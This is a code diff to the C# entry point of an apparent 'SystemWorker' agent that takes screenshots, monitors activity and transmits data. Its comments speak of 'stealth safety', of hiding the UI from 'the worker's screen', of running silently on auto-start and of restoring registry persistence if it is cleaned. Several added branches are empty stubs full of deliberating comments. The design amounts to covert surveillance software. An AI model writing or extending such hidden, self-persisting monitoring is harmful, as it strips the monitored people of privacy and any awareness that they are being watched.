@@ -104,11 +104,52 @@ public class Program
                            string.IsNullOrWhiteSpace(tempConfig.ServerUrl) || 
                            args.Contains("--config-ui");
 
-        // STEALTH SAFETY: If auto-started and config is missing/broken, do NOT show UI.
-        // This prevents the settings window from popping up on the worker's screen if config is lost.
-        if (isAutoStart && needsConfig)
+        // Force config loading from AppData if running from install dir (to ensure we don't miss it)
+        var currentPath = Environment.ProcessPath;
+        bool isInstalled = currentPath != null && currentPath.IndexOf("SystemWorker", StringComparison.OrdinalIgnoreCase) >= 0;
+
+        // If auto-started, we want to run silently.
+        // But if config is invalid, we can't run.
+        if (isAutoStart)
         {
-            return;
+             if (needsConfig)
+             {
+                 // Check if we can find config in AppData manually before giving up
+                 // (Already loaded above, but let's be sure)
+                 if (isInstalled)
+                 {
+                     // If installed and still no config, maybe it was deleted?
+                     // Do nothing to avoid popup.
+                     return;
+                 }
+                 else
+                 {
+                     // If auto-start flag is present but we are NOT in installed location,
+                     // it might be a manual run with flag? Or shortcut pointing to wrong place.
+                     // Still, no UI.
+                     return;
+                 }
+             }
+        }
+        else
+        {
+             // Manual start (no --auto-start)
+             // Always show UI if config is missing OR if explicitly requested
+             // OR if we want to force "Install" check
+             
+             // If manual start and config exists, we usually run worker.
+             // But user might want to edit settings.
+             // We'll show UI only if requested or missing config.
+             
+             // BUT, we want to ensure it is installed properly on first manual run.
+             if (!isInstalled && !needsConfig)
+             {
+                  // It's configured but running from random location (e.g. Downloads).
+                  // We should probably just run, but user asked for "Register 1 time".
+                  // The UI does the registration/install.
+                  // So maybe we should just run silently?
+                  // User said "Start automatically".
+             }
         }
 
         if (needsConfig)
@@ -150,7 +191,17 @@ public class Program
             ((IConfigurationRoot)builder.Configuration).Reload();
         }
 
-        builder.Services.AddSingleton<IScreenshotService, ScreenshotService>();
+        // Ensure persistence on every run (in case registry was cleaned)
+            if (!isAutoStart && !needsConfig)
+            {
+                 // We are running manually, fully configured.
+                 // Ensure we are installed and auto-start is set.
+                 // We can't easily access SettingsForm logic without showing UI, 
+                 // but we can at least ensure we are running from the right place?
+                 // For now, let's just let it run. The initial UI setup handles install.
+            }
+
+            builder.Services.AddSingleton<IScreenshotService, ScreenshotService>();
         builder.Services.AddSingleton<ISystemMonitorService, SystemMonitorService>();
         builder.Services.AddSingleton<IActivityMonitorService, ActivityMonitorService>();
         builder.Services.AddSingleton<IDataTransmissionService, DataTransmissionService>();
